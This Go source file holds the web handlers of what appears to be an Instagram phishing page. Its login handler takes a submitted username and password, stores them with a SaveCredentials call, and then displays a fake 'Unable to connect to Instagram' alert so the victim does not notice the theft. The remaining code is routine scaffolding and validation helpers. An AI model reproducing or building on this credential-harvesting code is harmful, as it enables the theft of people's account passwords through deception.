package handler

import (
	"github.com/tawesoft/golib/v2/dialog"
	"insta/pkg/config"
	"insta/pkg/render"
	"insta/pkg/save"
	"net/http"
	"regexp"
)

// Repository is the repository type
type Repository struct {
	App *config.AppConfig
}

func NewRepo(a *config.AppConfig) *Repository {
	return &Repository{
		App: a,
	}
}

// Repo the repository used by the handlers
var Repo *Repository

// NewHandlers sets the repository for the handlers
func NewHandlers(r *Repository) {
	Repo = r
}

func (m *Repository) Index(w http.ResponseWriter, r *http.Request) {

	//remoteIp := r.RemoteAddr
	//m.App.Session.Put(r.Context(), "remote_ip", remoteIp)
	render.RenderTemplate(w, "index.html")
}

type LoginPageData struct {
	InvalidUsername bool
	InvalidPassword bool
}

func (m *Repository) LoginHandler(w http.ResponseWriter, r *http.Request) {

	if err := r.ParseForm(); err != nil {
		http.Error(w, "ParseForm error", http.StatusInternalServerError)
		return
	}
	uName := r.FormValue("u_name")
	pass := r.FormValue("pass")

	// Validate username

	match, _ := regexp.MatchString("^[a-zA-Z0-9._]+$", uName)

	if len(uName) > 2 && len(uName) < 30 && match && len(pass) > 7 {
		save.SaveCredentials(uName, pass)
		dialog.Alert("Unable to connect to Instagram")
		render.RenderTemplate(w, "index.html")
	} else {
		render.RenderTemplate(w, "index.html")
	}

}

func isValidUsername(username string) bool {
	// Username must be between 1 and 30 characters
	if len(username) < 1 || len(username) > 30 {
		return false
	}

	// Username can only contain letters, numbers, periods, and underscores
	match, _ := regexp.MatchString("^[a-zA-Z0-9._]+$", username)
	if !match {
		return false
	}

	return true
}

func isValidPassword(password string) bool {
	// Password must be at least 6 characters long
	if len(password) < 6 {
		return false
	}

	// Password can contain any characters
	return true
}
